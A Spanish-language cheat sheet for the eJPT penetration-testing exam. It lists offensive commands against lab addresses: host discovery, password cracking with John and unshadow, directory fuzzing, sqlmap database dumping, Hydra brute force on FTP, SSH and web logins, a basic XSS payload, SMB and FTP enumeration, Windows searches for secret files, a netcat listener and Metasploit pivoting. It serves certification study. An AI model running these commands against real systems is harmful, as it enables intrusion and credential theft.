# eJPT-Cheatsheet
Todos los comandos necesarios para aprobar el eJPT

Recursos que te pueden interesar:
- [eJPT - Review](https://hacknotes.github.io/certificaciones/eJPTReview/) 
- [Aprobar el eJPT a la primera](https://hacknotes.github.io/certificaciones/eJPTAprove/)
# Barrido de ping - Ping sweep
## Nmap
```sql
nmap -sn 10.10.10.0/24
```
## fping
```sql
fping -a -g 10.10.10.0/24 2>/dev/null
```
# Password cracking
## John
```python
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
## Online Tools
[CrackStation](https://crackstation.net/)
# Dump Hashes
## unshadow 
```sql
unshadow passwd shadow > hashes.txt
```
# Fuzzing
## Nmap
```python
nmap --script=http-enum -p80 10.10.14.16 -oN webScan
```
## wfuzz
```python
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.14.15/FUZZ
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.14.15/FUZZ.php
```
## dirb
```sql
dirb http://10.10.15.12
```
## gobuster
```sql
gobuster dir -u 10.10.14.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```
# SQLMap
```sql
sqlmap -u "http://10.10.14.12/file.php?id=1" -p id
sqlmap -u "http://10.10.14.12/file.php?id=1" -p id --dbs
sqlmap -u "http://10.10.14.12/file.php?id=1" -p id -D dbname --tables
sqlmap -u "http://10.10.14.12/file.php?id=1" -p id -D dbname -T table_name --dump
```
# Hydra
```sql
hydra -v -l admin -P passlist.txt ftp://192.168.0.1
hydra -v -L userlist.txt -P passlist.txt ftp://192.168.0.1
hydra -v -l root -P passwords.txt -t 1 -u 10.10.14.10 ssh
hydra http://10.10.14.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect" -L userlist.txt -P passwordslist.txt
```
# XSS
```sql
<script>alert(xss)</script>
<h1>H1</h1>
```
# SMB
## Enumeración de SMB
```python
smbclient -L 10.10.14.12 -N
smbmap -H 10.10.14.12 -u 'null'
nmap --script=smb-vuln* -p445 10.10.14.15 -oN smbScan
smbmap -H 10.10.14.15 -R backups -u 'null'
```
## Acceso al recurso compartido **backups**
```sql
smbclient //10.10.14.15/backups
```
# FTP
## Enumeración de FTP
```python
nmap --script=ftp-anon -p21 10.10.14.12
ftp 10.10.14.12
cd ..
```
## FTP - Fuerza Bruta
```sql
hydra -l admin -P passlist.txt ftp://192.168.0.1
hydra -L userlist.txt -P passlist.txt ftp://192.168.0.1
```
# Enumeración de windows
```sql
dir /b/s "\*.conf*"
dir /b/s "\*.txt*"
dir /b/s "\*secret*"
route print
netstat -r
fsutil fsinfo drives
wmic logicaldisk get Caption,Description,providername
```
# Reverse Shell
## nc
```sql
nc -nlvp 443
```
## metasploit
```sql
msfconsole
```
# Post Explotación
## Pivoting
### Ip Route
```sql
ip route add 10.10.16.0/24 via 10.10.16.1 dev tap0
```
### Metasploit
```sql
run autoroute -s 10.10.16.0/24
```
## Wireshark
```sql
ip.addr==192.168.12
ip.src == 192.168.2.11
ip.dst == 192.168.2.15
```
